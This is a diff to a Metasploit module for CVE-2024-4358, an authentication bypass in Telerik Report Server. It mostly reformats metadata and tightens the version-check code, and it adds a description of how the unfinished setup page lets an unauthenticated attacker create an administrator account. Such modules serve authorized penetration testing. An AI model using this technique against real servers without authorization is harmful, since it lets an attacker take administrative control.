@@ -2,40 +2,48 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 
 class MetasploitModule < Msf::Auxiliary
+
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Telerik Report Server Auth Bypass',
-      'Description'    => %q{
-      },
-      'Author'         => [
-        'SinSinology', # CVE-2024-4358 discovery, original PoC and vulnerability write-up
-        'Spencer McIntyre' # MSF module
-      ],
-      'License'        => MSF_LICENSE,
-      'References'     => [
-        [ 'CVE', '2024-4358' ], # Authentication bypass # patched in 10.0.24.305
-        [ 'URL', 'https://summoning.team/blog/progress-report-server-rce-cve-2024-4358-cve-2024-1800/' ]
-      ],
-      'DefaultOptions' =>
-        {
+    super(
+      update_info(
+        info,
+        'Name' => 'Telerik Report Server Auth Bypass',
+        'Description' => %q{
+          This module exploits an authentication bypass vulnerability in Telerik Report Server versions 10.0.24.305 and
+          prior which allows an unauthenticated attacker to create a new account with administrative privileges. The
+          vulnerability leverages the initial setup page which is still accessible once the setup process has completed.
+
+          If either USERNAME or PASSWORD are not specified, then a random value will be selected. The module will fail if
+          the specified USERNAME already exists.
+        },
+        'Author' => [
+          'SinSinology', # CVE-2024-4358 discovery, original PoC and vulnerability write-up
+          'Spencer McIntyre' # MSF module
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          [ 'CVE', '2024-4358' ], # Authentication bypass # patched in > 10.0.24.305
+          [ 'URL', 'https://summoning.team/blog/progress-report-server-rce-cve-2024-4358-cve-2024-1800/' ]
+        ],
+        'DefaultOptions' => {
           'SSL' => false,
           'RPORT' => 83
         },
-      'DisclosureDate' => '2024-06-04',
-      'Notes'          =>
-        {
-          'Stability'   => [ CRASH_SAFE, ],
+        'DisclosureDate' => '2024-06-04',
+        'Notes' => {
+          'Stability' => [ CRASH_SAFE, ],
           'SideEffects' => [ IOC_IN_LOGS, ],
-          'Reliability' => [  ],
+          'Reliability' => [ ]
         },
-      'Actions' => [
-        [ 'CHECK', { 'Description' => 'Check for the vulnerability' } ],
-        [ 'EXPLOIT', { 'Description' => 'Exploit the vulnerability' } ]
-      ],
-      'DefaultAction' => 'EXPLOIT',
-    ))
+        'Actions' => [
+          [ 'CHECK', { 'Description' => 'Check for the vulnerability' } ],
+          [ 'EXPLOIT', { 'Description' => 'Exploit the vulnerability' } ]
+        ],
+        'DefaultAction' => 'EXPLOIT'
+      )
+    )
 
     register_options([
       OptString.new('TARGETURI', [ true, 'The base path to the web application', '/' ]),
@@ -89,8 +97,8 @@ class MetasploitModule < Msf::Auxiliary
     return Exploit::CheckCode::Safe unless res.code == 200
 
     html_doc = res.get_html_document
-    return Exploit::CheckCode::Safe unless html_doc&.xpath('//head/title').text.end_with?('Telerik Report Server')
-    return Exploit::CheckCode::Detected unless html_doc&.xpath('//head/script').text =~ /['"]dimension2['"]:\s*['"](?<version>(\d+\.)+(\d+))['"]/
+    return Exploit::CheckCode::Safe unless html_doc&.xpath('//head/title')&.text&.end_with?('Telerik Report Server')
+    return Exploit::CheckCode::Detected unless html_doc&.xpath('//head/script')&.text =~ /['"]dimension2['"]:\s*['"](?<version>(?<d1>\d+\.)+(?<d2>\d+))['"]/
 
     version = Rex::Version.new(Regexp.last_match('version'))
     details = { version: version }
@@ -103,7 +111,7 @@ class MetasploitModule < Msf::Auxiliary
     Exploit::CheckCode::Vulnerable("Telerik Report Server #{version} is affected.", details: details)
   end
 
-  alias_method :check, :action_check
+  alias check action_check
 
   def action_exploit
     print_status('Creating a new administrator account using CVE-2024-4358')
